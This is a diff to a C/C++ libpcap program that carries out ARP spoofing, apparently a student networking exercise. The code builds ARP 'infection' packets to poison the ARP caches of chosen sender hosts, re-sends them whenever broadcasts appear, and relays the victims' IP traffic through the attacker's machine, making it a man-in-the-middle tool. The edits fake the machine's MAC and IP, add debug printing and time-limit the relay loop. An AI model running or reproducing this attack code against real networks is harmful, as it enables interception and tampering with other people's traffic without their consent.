@@ -10,7 +10,7 @@ int main(int argc, char* argv[])
     // open modules
     char* dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 0, 1000, errbuf);
     if (handle == nullptr) {
         fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
         return -1;
@@ -35,9 +35,13 @@ int main(int argc, char* argv[])
         memcpy(address_table[i].tgt_mac, target_mac, MAC_SIZE);
         address_table[i].tgt_ip = inet_addr(argv[2*(i+1)+1]);
     }
+    printf("sesson size: %d\n", session_size);
 
-    Print((const uint8_t*)address_table, sizeof(addr_pair), session_size, "address table");   // testing
-
+    for(int i = 0; i < session_size; i++)
+    {
+        printf("%dth address table\n", i+1);
+        Print((const uint8_t*)&address_table[i], sizeof(addr_pair));
+    }
 
     // make all infection packets
     arp_packet* infected_arp_lists = (arp_packet*)calloc(session_size, sizeof(arp_packet));
@@ -45,9 +49,11 @@ int main(int argc, char* argv[])
 
     uint8_t my_mac[MAC_SIZE] = {0, };
     GetSvrMACAddress(my_mac);
+    my_mac[5] += 1; // set virtual mac
 
     uint32_t my_ip = 0;
     GetSvrIPAddress(&my_ip);
+    my_ip += 1; // set virtual ip
 
     for(int i = 0; i < session_size; i++)
     {
@@ -71,7 +77,7 @@ int main(int argc, char* argv[])
         {
             // I -> sender (making restored packet)
             memcpy(restored_arp_lists[i].e.ether_dhost, address_table[i].sdr_mac, MAC_SIZE);
-            memcpy(restored_arp_lists[i].e.ether_shost, my_mac, MAC_SIZE);
+            memcpy(restored_arp_lists[i].e.ether_shost, address_table[i].tgt_mac, MAC_SIZE);
             restored_arp_lists[i].e.ether_type = htons(ETHERTYPE_ARP);
 
             restored_arp_lists[i].a.ar_hrd = htons(ARPHRD_ETHER);
@@ -87,8 +93,17 @@ int main(int argc, char* argv[])
         }
     }
 
-    Print((const uint8_t*)infected_arp_lists, sizeof(arp_packet), session_size, "infection");   // testing
-    Print((const uint8_t*)restored_arp_lists, sizeof(arp_packet), session_size, "restoration");   // testing
+    for(int i = 0; i < session_size; i++)
+    {
+        printf("%dth infected arp packet\n", i + 1);
+        Print((const uint8_t*)&infected_arp_lists[i], sizeof(arp_packet));
+    }
+
+    for(int i = 0; i < session_size; i++)
+    {
+        printf("%dth restored arp packet\n", i + 1);
+        Print((const uint8_t*)&restored_arp_lists[i], sizeof(arp_packet));
+    }
 
 //    printf("press any key to continue..\n");
 //    getchar();
@@ -109,11 +124,21 @@ int main(int argc, char* argv[])
                 return -1;
             }
         }
+        sleep(1);
     }
 
+//    printf("press any key to continue..\n");
+//    getchar();
+
+//    pcap_close(handle);
+//    free(address_table);
+//    free(infected_arp_lists);
+//    free(restored_arp_lists);
+//    return 0;
 
     // Relay all ip packets
-    while(true)
+    clock_t start_time = clock() / 1000;
+    while(clock() / 1000 - start_time < 10)
     {
         struct pcap_pkthdr* header;
         const uint8_t* packet;
@@ -121,34 +146,47 @@ int main(int argc, char* argv[])
         if (res == 0) continue;
         if (res == -1 || res == -2) break;
 
-        uint8_t target_mac[MAC_SIZE] = {0, };
-
-        // if the packet is broadcasting packet from sender to target..
-        if( is_broadcasting_packet(packet) ) {
-            get_target_mac_from_arp_table(target_mac, packet, address_table, session_size);
-            if( !strlen((char*)target_mac) ) continue;  // continue if the sender was not in our table
-
-            int i = get_session_location(target_mac, address_table, session_size);
-            for(int cnt = 0; cnt < 3; cnt++) {   // send packet three times
-                sleep(1);   // make term before we send arp packet
-                if( pcap_sendpacket(handle, (const uint8_t*)&infected_arp_lists[i], sizeof(arp_packet)) ) {
-                    printf("broadcast arp packet sending failed\n");
-                    return -1;
-                }
-            }
+        if( is_broadcasting_packet(packet) )
+        {
+            send_infection_packet(handle, packet, infected_arp_lists, address_table, session_size);
+            printf("broadcasting packet captured\n");
+        }
+        else if( is_ip_packet(packet) )
+        {
+            send_relay_packet(handle, packet, address_table, session_size, header->caplen);
+            printf("ip packet captured\n");
         }
 
-        // if the packet is ip packet that we need to relay from sender to target..
-        if( is_ip_packet(packet) ) {
-            get_target_mac_from_arp_table(target_mac, packet, address_table, session_size);
-            if( !strlen((char*)target_mac) ) continue;  // continue if that target mac was not in arp table
 
-            set_relay_packet(packet, target_mac, my_mac);
-            if( pcap_sendpacket(handle, packet, header->caplen)) {
-                printf("relay packet sending failed\n");
-                return -1;
-            }
-        }
+
+//        uint8_t target_mac[MAC_SIZE] = {0, };
+
+//        // if the packet is broadcasting packet from sender to target..
+//        if( is_broadcasting_packet(packet) ) {
+//            get_target_mac_from_arp_table(target_mac, packet, address_table, session_size);
+//            if( !strlen((char*)target_mac) ) continue;  // continue if the sender was not in our table
+
+//            int i = get_session_location(target_mac, address_table, session_size);
+//            for(int cnt = 0; cnt < 3; cnt++) {   // send packet three times
+//                sleep(1);   // make term before we send arp packet
+//                if( pcap_sendpacket(handle, (const uint8_t*)&infected_arp_lists[i], sizeof(arp_packet)) ) {
+//                    printf("broadcast arp packet sending failed\n");
+//                    return -1;
+//                }
+//            }
+//        }
+
+//        // if the packet is ip packet that we need to relay from sender to target..
+//        if( is_ip_packet(packet) ) {
+//            get_target_mac_from_arp_table(target_mac, packet, address_table, session_size);
+//            if( !strlen((char*)target_mac) ) continue;  // continue if that target mac was not in arp table
+
+//            set_relay_packet(packet, target_mac, my_mac);
+//            if( pcap_sendpacket(handle, packet, header->caplen)) {
+//                printf("relay packet sending failed\n");
+//                return -1;
+//            }
+//        }
     }
 
 
